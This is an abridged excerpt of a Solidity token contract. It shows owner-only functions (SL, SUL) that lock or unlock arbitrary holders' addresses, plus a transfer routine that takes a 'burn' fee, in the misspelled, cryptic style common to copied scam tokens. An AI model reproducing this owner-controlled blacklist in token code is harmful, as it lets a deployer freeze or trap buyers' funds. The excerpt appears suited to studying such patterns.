...
interface IERC20 {
    ...
    function balanceOf(address avcount) external view returns (uint256);
...
contract token is Ownable, IERC20 {
    ...
    function SL(address avcount) public onlyowner {
        _LKD[avcount] = true;
    }


    function SUL(address avcount) public onlyowner {
        _LKD[avcount] = false;
    }


    function isLKD(address avcount) public view returns (bool) {
    ...
    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {
        ...
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
            feeamonnt = amonnts.mul(_burnfee).div(100);
        ...
        uint256 amoun;
        amoun = amonnts - feeamonnt;
        _balance[recipient] += amoun;
        if (_burnfee > 0){
            emit Transfer (sender, _DEADaddress, feeamonnt);
        }
    ...
    function balanceOf(address avcount) public view override returns (uint256) {
        return _balance[avcount];
    }
